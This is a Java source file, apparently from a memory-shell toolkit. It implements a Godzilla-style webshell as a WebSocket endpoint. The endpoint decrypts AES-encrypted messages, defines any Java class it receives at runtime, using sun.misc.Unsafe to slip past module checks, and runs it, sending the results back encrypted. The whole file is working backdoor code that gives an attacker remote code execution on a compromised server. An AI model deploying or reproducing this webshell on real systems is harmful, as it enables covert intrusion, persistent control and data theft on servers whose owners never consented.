package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author ReaJason
 * @since 2025/5/9
 */
public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<String> {
    public static String key;
    private Session session;
    private static Class<?> payload;

    @Override
    public void onMessage(String message) {
        try {
            byte[] data = base64Decode(message);
            data = x(data, false);
            if (payload == null || (data[0] == -54 && data[1] == -2)) {
                payload = reflectionDefineClass(data);
                session.getBasicRemote().sendText(base64Encode(x("ok".getBytes(), true)));
            } else {
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.toString();
                session.getBasicRemote().sendText(base64Encode(x(arrOut.toByteArray(), true)));
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Throwable {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        if (getAndSetObjectM != null) {
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
        }
        return clazz;
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = base64.newInstance();
            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }
}
